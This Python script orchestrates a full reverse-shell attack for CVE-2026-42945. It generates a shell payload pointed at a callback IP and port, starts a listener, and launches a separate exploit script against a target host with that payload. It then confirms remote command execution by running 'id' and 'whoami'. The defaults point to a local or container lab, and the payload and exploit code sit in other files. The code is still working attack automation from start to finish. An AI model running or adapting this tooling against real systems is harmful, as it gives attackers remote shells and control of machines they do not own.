#!/usr/bin/env python3
"""
shell_manager.py — Orchestrates reverse shell lifecycle for CVE-2026-42945

Manages the full end-to-end flow:
  1. Start listener thread
  2. Generate shell payload
  3. Trigger exploit with payload
  4. Verify shell connection
  5. Capture output
  6. Clean up

This is the high-level orchestrator used by shell_verify.py.
"""

import json
import logging
import os
import signal
import socket
import subprocess
import sys
import threading
import time

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
EXPLOIT_SCRIPT = os.path.join(ROOT_DIR, "exploit", "exploit.py")
PAYLOADS_SCRIPT = os.path.join(SCRIPT_DIR, "shell_payloads.py")
LISTENER_SCRIPT = os.path.join(SCRIPT_DIR, "shell_listener.py")


def setup_logger(name="shell_manager", level=logging.INFO):
    logger = logging.getLogger(name)
    logger.setLevel(level)
    if not logger.handlers:
        ch = logging.StreamHandler()
        ch.setFormatter(logging.Formatter(
            "[%(asctime)s] %(levelname)s: %(message)s",
            datefmt="%H:%M:%S"
        ))
        logger.addHandler(ch)
    return logger


class ShellManager:
    """Manages a reverse shell lifecycle."""

    def __init__(self, target_host="127.0.0.1", target_port=19321,
                 listen_host="0.0.0.0", listen_port=1337,
                 callback_ip="172.17.0.1", shell_type="python",
                 verify_cmds=None, tries=5, timeout=45,
                 logger=None):
        self.target_host = target_host
        self.target_port = target_port
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.callback_ip = callback_ip
        self.shell_type = shell_type
        self.verify_cmds = verify_cmds or ["id", "whoami"]
        self.tries = tries
        self.timeout = timeout
        self.logger = logger or setup_logger()
        self.listener_proc = None
        self._results = {}

    def _wait_for_listener(self, timeout=10):
        start = time.time()
        while time.time() - start < timeout:
            try:
                s = socket.create_connection(
                    (self.listen_host, self.listen_port), timeout=1
                )
                s.close()
                return True
            except (ConnectionRefusedError, OSError):
                time.sleep(0.2)
        return False

    def _generate_payload(self):
        cmd = [
            sys.executable, PAYLOADS_SCRIPT,
            "--type", self.shell_type,
            "--host", self.callback_ip,
            "--port", str(self.listen_port),
            "--limit", "1",
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode != 0:
            raise RuntimeError(f"Payload gen failed: {result.stderr}")

        for line in result.stdout.splitlines():
            line = line.strip()
            if line and not line.startswith("#") and not line.startswith("["):
                return line
        raise RuntimeError("Could not extract payload from output")

    def _start_listener(self):
        cmd = [
            sys.executable, LISTENER_SCRIPT,
            "--host", self.listen_host,
            "--port", str(self.listen_port),
            "--verify",
            "--verify-cmd", self.verify_cmds[0],
            "--verify-timeout", str(self.timeout),
            "--max-connections", "1",
        ]
        self.logger.debug(f"Starting listener: {' '.join(cmd)}")
        self.listener_proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        if not self._wait_for_listener():
            raise RuntimeError("Listener failed to start")
        self.logger.info(f"Listener ready on {self.listen_host}:{self.listen_port}")

    def _run_exploit(self, payload):
        cmd = [
            sys.executable, EXPLOIT_SCRIPT,
            "--host", self.target_host,
            "--port", str(self.target_port),
            "--cmd", payload,
            "--tries", str(self.tries),
        ]
        self.logger.info(f"Running exploit against {self.target_host}:{self.target_port}")
        self.logger.debug(f"Exploit: {' '.join(cmd)}")

        self.exploit_proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )

        output_lines = []
        deadline = time.time() + self.timeout
        while time.time() < deadline:
            try:
                line = self.exploit_proc.stdout.readline()
                if not line and self.exploit_proc.poll() is not None:
                    break
                if line:
                    output_lines.append(line.rstrip())
                    self.logger.debug(f"[exploit] {line.rstrip()}")
            except (ValueError, OSError):
                break
        return output_lines

    def _collect_listener_output(self):
        try:
            out, _ = self.listener_proc.communicate(timeout=10)
            return out or ""
        except subprocess.TimeoutExpired:
            self.listener_proc.kill()
            out, _ = self.listener_proc.communicate(timeout=5)
            return out or ""

    def run(self):
        """Execute the full reverse shell lifecycle."""
        self.logger.info("=" * 50)
        self.logger.info(f"Shell Manager: {self.shell_type} → "
                         f"{self.callback_ip}:{self.listen_port}")
        self.logger.info("=" * 50)

        try:
            self.logger.info("Phase 1: Generate payload")
            payload = self._generate_payload()
            self.logger.info(f"Payload: {payload[:80]}...")

            self.logger.info("Phase 2: Start listener")
            self._start_listener()

            self.logger.info(f"Phase 3: Run exploit (tries={self.tries})")
            exploit_output = self._run_exploit(payload)

            self.logger.info("Phase 4: Collect results")
            listener_output = self._collect_listener_output()

            verified = "VERIFIED" in listener_output or "PASS" in listener_output
            connected = "established" in listener_output or "connected" in listener_output

            self._results = {
                "target": f"{self.target_host}:{self.target_port}",
                "shell_type": self.shell_type,
                "callback": f"{self.callback_ip}:{self.listen_port}",
                "payload": payload[:200],
                "verified": verified,
                "connected": connected,
                "exploit_output": exploit_output[-20:],
                "listener_output": listener_output[:2000],
                "verify_cmds": self.verify_cmds,
            }

            if verified:
                self.logger.info("REVERSE SHELL VERIFIED SUCCESSFULLY")
            elif connected:
                self.logger.warning("Shell connected but verification incomplete")
            else:
                self.logger.error("Reverse shell verification FAILED")

            return self._results

        except Exception as e:
            self.logger.error(f"Shell manager failed: {e}")
            self._results = {"error": str(e)}
            return self._results

        finally:
            self.cleanup()

    def cleanup(self):
        if self.listener_proc and self.listener_proc.poll() is None:
            self.listener_proc.terminate()
            try:
                self.listener_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.listener_proc.kill()
        if hasattr(self, 'exploit_proc') and self.exploit_proc.poll() is None:
            self.exploit_proc.terminate()

    def get_results(self):
        return self._results

    def get_results_json(self, indent=2):
        return json.dumps(self._results, indent=indent)


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="CVE-2026-42945 Shell Manager"
    )
    parser.add_argument("--target-host", default="127.0.0.1")
    parser.add_argument("--target-port", type=int, default=19321)
    parser.add_argument("--listen-host", default="0.0.0.0")
    parser.add_argument("--listen-port", type=int, default=1337)
    parser.add_argument("--callback-ip", default="172.17.0.1")
    parser.add_argument("--shell-type", default="python")
    parser.add_argument("--verify-cmds", default="id,whoami")
    parser.add_argument("--tries", type=int, default=5)
    parser.add_argument("--timeout", type=int, default=45)
    parser.add_argument("--json", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    level = logging.DEBUG if args.verbose else logging.INFO
    logger = setup_logger(level=level)

    mgr = ShellManager(
        target_host=args.target_host,
        target_port=args.target_port,
        listen_host=args.listen_host,
        listen_port=args.listen_port,
        callback_ip=args.callback_ip,
        shell_type=args.shell_type,
        verify_cmds=args.verify_cmds.split(","),
        tries=args.tries,
        timeout=args.timeout,
        logger=logger,
    )

    results = mgr.run()

    if args.json:
        print(json.dumps(results, indent=2))

    if results.get("verified"):
        return 0
    elif results.get("connected"):
        return 2
    else:
        return 1


if __name__ == "__main__":
    sys.exit(main())
